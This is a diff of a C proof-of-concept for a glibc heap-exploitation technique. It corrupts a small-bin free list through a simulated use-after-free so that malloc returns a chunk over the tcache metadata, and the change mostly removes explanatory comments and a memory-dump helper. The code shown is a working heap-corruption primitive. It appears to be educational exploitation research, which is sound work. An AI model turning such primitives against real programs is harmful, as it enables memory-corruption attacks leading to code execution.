@@ -37,21 +37,11 @@ This PoC demonstrates how to obtain a pointer to the tcache metadata as a return
 #include <assert.h>
 #include <unistd.h>
 
-void dump_memory(void *addr, unsigned long count) {
-	for (unsigned int i = 0; i < count*16; i += 16) {
-		printf("0x%016lx\t\t0x%016lx  0x%016lx\n", (unsigned long)(addr+i), *(long *)(addr+i), *(long *)(addr+i+0x8));
-	}
-}
-
 int main(void) {
 	setbuf(stdin, NULL);
 	setbuf(stdout, NULL);
-	setbuf(stderr, NULL);
 
-	// --- STEP 1: Forge a size header in tcache metadata ---
-	// Freeing chunks in these bins sets their counts to 1.
-	// In the metadata, this looks like bytes 0x01 0x00 0x01 0x00 ...
-	// which can be interpreted as a size field (e.g., 0x10001).
+	// 1. Forge size header in tcache metadata
 	void *fake_size_lsb = malloc(0x3d8);
 	void *fake_size_msb = malloc(0x3e8);
 	free(fake_size_lsb);
@@ -59,60 +49,47 @@ int main(void) {
 
 	void *metadata = (void *)((long)(fake_size_lsb) & ~(0xfff));
 
-	// --- STEP 2: Prepare Small Bin chunks ---
-	// We need 7 chunks to fill the tcache later.
+	// 2. Prepare Small Bin chunks
 	void *x[7];
 	for (int i = 0; i < 7; i++) x[i] = malloc(0x88);
 
-	// Create a Small Bin list: start <-> middle <-> end
 	void *small_start = malloc(0x88);
-	malloc(0x18); // Guard
+	malloc(0x18); 
 	void *small_middle = malloc(0x88);
-	malloc(0x18); // Guard
+	malloc(0x18); 
 	void *small_end = malloc(0x88);
-	malloc(0x18); // Guard
+	malloc(0x18); 
 
-	// --- STEP 3: Satisfy "Next Chunk" checks ---
-	// Since we forged a 0x10001 size, we must ensure the "next"
-	// chunk at that offset has sane metadata.
-	malloc(0xf000); // Padding
+	// 3. Satisfy Next Chunk checks
+	malloc(0xf000); 
 	void *end_of_fake = malloc(0x18);
 	*(long *)end_of_fake = 0x10000;
 	*(long *)(end_of_fake+0x8) = 0x20;
 
-	// --- STEP 4: Fill Tcache ---
 	for (int i = 0; i < 7; i++) free(x[i]);
 
-	// --- STEP 5: Overlay Small Bin pointers with Tcache headers ---
-	// This step uses a UAF/Arbitrary-Free to place pointers to
-	// small_start and small_end into the 0x30 and 0x20 tcache bins.
-	// (Simulated here for clarity)
+	// 4. Overlay Small Bin pointers with Tcache headers (simulated UAF)
 	*(long*)(small_start-0x18) = 0x31;
 	free(small_start-0x10);
-	*(long*)(small_start-0x8) = 0x91; // Restore header
+	*(long*)(small_start-0x8) = 0x91; 
 
 	*(long*)(small_end-0x18) = 0x21;
 	free(small_end-0x10);
-	*(long*)(small_end-0x8) = 0x91; // Restore header
+	*(long*)(small_end-0x8) = 0x91; 
 
-	// --- STEP 6: Free chunks into Small Bin ---
 	free(small_end);
 	free(small_middle);
 	free(small_start);
 
-	// --- STEP 7: Link Tcache Metadata into Small Bin ---
-	// VULNERABILITY: Corrupt the list to include the metadata
+	// 5. VULNERABILITY: Corrupt Small Bin list to include metadata
 	*(unsigned long *)small_start = (unsigned long)(metadata+0x80);
 	*(unsigned long *)(small_end+0x8) = (unsigned long)(metadata+0x80);
 
-	// --- STEP 8: Cash Out ---
-	// 7 allocations to empty tcache
-	// 1 allocation triggers reverse refilling from Small Bin
-	for(int i=0; i<9; i++) malloc(0x88);
+	for(int i=0; i<9; i++) malloc(0x88); // Cash out
 
 	void *meta_chunk = malloc(0x88);
-	printf("New chunk @ %p (Metadata @ %p)\n", meta_chunk, metadata);
 	assert(meta_chunk == (metadata+0x90));
+	return 0;
 }
 ```
 
